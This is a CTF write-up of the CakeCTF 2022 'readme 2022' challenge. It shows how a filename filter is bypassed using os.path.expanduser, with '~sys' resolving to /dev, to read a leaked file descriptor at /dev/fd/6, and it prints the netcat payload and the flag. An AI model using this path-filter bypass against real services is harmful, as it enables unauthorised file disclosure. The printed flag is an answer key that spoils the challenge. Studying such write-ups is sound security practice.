# readme 2022

<span id="-misc"></span><span id="misc" class="tag">misc</span>

The code receives a filename via a TCP socket and runs it through
`os.path.expanduser`. This function expands the `~` character to the
current user's home. Another user can be supplied like this `~root`,
which will be expanded to `/root`.

The current working directory is `/app` and `..` sequences nor absolute
paths can be used.

    try:
        f = open("/flag.txt", "r")
        print(f.fileno())
    except:
        print("[-] Flag not found. If this message shows up")
        print("    on the remote server, please report to amdin.")

    if __name__ == '__main__':
        filepath = input("filepath: ")
        if filepath.startswith("/"):
            exit("[-] Filepath must not start with '/'")
        elif '..' in filepath:
            exit("[-] Filepath must not contain '..'")

        filepath = os.path.expanduser(filepath)
        print("Expanded: " + filepath)
        try:
            print(open(filepath, "r").read())
        except:
            exit("[-] Could not open file")

At first I looked at the source code for `os.path.expanduser` but
couldn't really find anything useful. I then took a look at my own
`/etc/passwd` and was surprised to see that there were a few users whose
home is `/`:

    root:x:0:0::/root:/bin/bash
    bin:x:1:1::/:/usr/bin/nologin
    daemon:x:2:2::/:/usr/bin/nologin
    mail:x:8:12::/var/spool/mail:/usr/bin/nologin
    ftp:x:14:11::/srv/ftp:/usr/bin/nologin
    <snip>

Unfortunately, there were no users with such a home in the container's
`/etc/passwd`, so it wasn't as simple as `~bin/flag.txt`. There were a
few possibly interesting directories, however. I thought that maybe for
some reason one of these directories could have a symlink back to `/`,
so I listed all symlinks they contained.

    ctf@acac7d7c8065:/app$ find /root /usr/sbin /bin /dev /usr/games /var/cache/man /var/spool/lpd /var/mail /var/spool /var/www /var/backups /var/list /var/run/ircd /var/lib/gnats /home/ctf -type l 2>/dev/null
    /usr/sbin/addgroup
    /usr/sbin/vigr
    /usr/sbin/delgroup
    /usr/sbin/cpgr
    /usr/sbin/rmt
    /bin/pidof
    /bin/sh
    /bin/ypdomainname
    /bin/domainname
    /bin/nisdomainname
    /bin/dnsdomainname
    /bin/rbash
    /dev/core
    /dev/stderr
    /dev/stdout
    /dev/stdin
    /dev/fd
    /dev/ptmx
    /var/spool/mail

`/dev/fd` immediately caught my attention. The script calls `open` with
the flag right at the start and never actually closes the file. If
`/dev/fd` allows us to read any open file descriptor, this could be used
to read the flag.

Taking a look back at `/etc/passwd` we see that the user `sys`' home is
`/dev`, so that's the user we need to use.

    sys:x:3:3:sys:/dev:/usr/sbin/nologin

After trying a few numbers, I found that 6 was the flag's file
descriptor.

    readme2022$ nc misc.2022.cakectf.com 12022 <<< '~sys/fd/6'
    filepath: CakeCTF{~USER_r3f3rs_2_h0m3_d1r3ct0ry_0f_USER}

The flag is: `CakeCTF{~USER_r3f3rs_2_h0m3_d1r3ct0ry_0f_USER}`.
